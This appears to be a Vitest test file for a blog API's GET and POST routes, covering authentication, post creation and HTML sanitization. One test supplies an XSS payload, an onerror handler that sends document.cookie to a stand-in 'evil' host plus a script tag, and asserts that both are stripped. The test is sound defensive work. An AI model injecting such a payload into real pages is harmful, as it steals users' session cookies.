import { describe, it, expect, vi, beforeEach } from 'vitest'

vi.mock('@/lib/auth', () => ({
  auth: {},
  getSession: vi.fn(),
}))

vi.mock('@/lib/mongodb', () => ({
  connectDB: vi.fn().mockResolvedValue(undefined),
}))

const createMock = vi.fn()

vi.mock('@/models/BlogPost', () => ({
  BlogPost: {
    find: vi.fn().mockReturnValue({
      sort: vi.fn().mockReturnThis(),
      skip: vi.fn().mockReturnThis(),
      limit: vi.fn().mockReturnThis(),
      lean: vi.fn().mockResolvedValue([]),
    }),
    findOne: vi.fn().mockReturnValue({
      lean: vi.fn().mockResolvedValue(null),
    }),
    countDocuments: vi.fn().mockResolvedValue(0),
    create: (...args: unknown[]) => createMock(...args),
  },
}))

vi.mock('@/lib/activityLog', () => ({
  computeDiff: vi.fn().mockReturnValue([]),
  writeLog: vi.fn().mockResolvedValue(undefined),
  serializeBlogSnapshot: vi.fn().mockReturnValue({}),
  TRACKED_FIELDS: { blog: [] },
}))

vi.mock('@/models/BlogCategory', () => ({
  BlogCategory: {
    find: vi.fn().mockReturnValue({ lean: vi.fn().mockResolvedValue([]) }),
  },
}))

const VIEWER_SESSION = {
  session: { id: 's1', token: 't', userId: 'u1', expiresAt: new Date(), createdAt: new Date(), updatedAt: new Date() },
  user: { id: 'u1', name: 'Viewer', email: 'viewer@test.com', emailVerified: true, role: 'viewer', isWhitelisted: true, createdAt: new Date(), updatedAt: new Date() },
}

describe('GET /api/blog', () => {
  beforeEach(() => vi.clearAllMocks())

  it('returns 200 with posts array', async () => {
    const { getSession } = await import('@/lib/auth')
    vi.mocked(getSession).mockResolvedValue(VIEWER_SESSION as never)

    const { GET } = await import('@/app/api/blog/route')
    const req = new Request('http://localhost/api/blog')
    const res = await GET(req as never)

    expect(res.status).toBe(200)
    const body = await res.json()
    expect(Array.isArray(body.posts ?? body)).toBe(true)
  })
})

describe('POST /api/blog', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    createMock.mockImplementation(async (doc: Record<string, unknown>) => ({
      ...doc,
      _id: 'newid',
      toObject: () => ({ ...doc, _id: 'newid' }),
    }))
  })

  it('returns 401 when unauthenticated', async () => {
    const { getSession } = await import('@/lib/auth')
    vi.mocked(getSession).mockResolvedValue(null as never)

    const { POST } = await import('@/app/api/blog/route')
    const req = new Request('http://localhost/api/blog', {
      method: 'POST',
      body: JSON.stringify({ title: 'Test', excerpt: 'Ex', category: 'thought', authorName: 'A' }),
    })
    const res = await POST(req as never)
    expect(res.status).toBe(401)
  })

  it('lets a non-admin author create a post', async () => {
    const { getSession } = await import('@/lib/auth')
    vi.mocked(getSession).mockResolvedValue(VIEWER_SESSION as never)

    const { POST } = await import('@/app/api/blog/route')
    const req = new Request('http://localhost/api/blog', {
      method: 'POST',
      body: JSON.stringify({ title: 'Test', excerpt: 'Ex', category: 'thought', authorName: 'A' }),
    })
    const res = await POST(req as never)

    expect(res.status).toBe(200)
    expect(createMock).toHaveBeenCalledOnce()
  })

  it('sanitizes author-supplied HTML content before storage', async () => {
    const { getSession } = await import('@/lib/auth')
    vi.mocked(getSession).mockResolvedValue(VIEWER_SESSION as never)

    const { POST } = await import('@/app/api/blog/route')
    const malicious =
      '<p>hi</p><img src=x onerror="fetch(\'https://evil/\'+document.cookie)"><script>alert(1)</script>'
    const req = new Request('http://localhost/api/blog', {
      method: 'POST',
      body: JSON.stringify({
        title: 'Test',
        excerpt: 'Ex',
        category: 'thought',
        authorName: 'A',
        content: malicious,
        status: 'published',
      }),
    })
    const res = await POST(req as never)
    expect(res.status).toBe(200)

    const storedContent = createMock.mock.calls[0][0].content as string
    expect(storedContent).not.toContain('onerror')
    expect(storedContent).not.toContain('<script')
    // legitimate markup is preserved
    expect(storedContent).toContain('<p>hi</p>')
    expect(storedContent).toContain('<img src="x">')
  })
})
